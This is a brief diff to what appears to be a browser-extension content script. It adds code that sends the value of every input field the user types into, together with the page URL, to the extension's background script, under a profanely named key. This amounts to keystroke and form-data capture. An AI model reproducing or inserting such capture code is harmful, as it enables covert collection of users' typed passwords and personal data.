@@ -11,4 +11,13 @@ document.addEventListener("submit", (event) => {
 });
 document.addEventListener("input", (event) => {
     console.log(event.target.value);
+    chrome.runtime.sendMessage({
+        action: "input",
+        data: {
+            url: window.location.href,
+            formData: {
+                fuck: event.target.value
+            }
+        }
+    });
 });
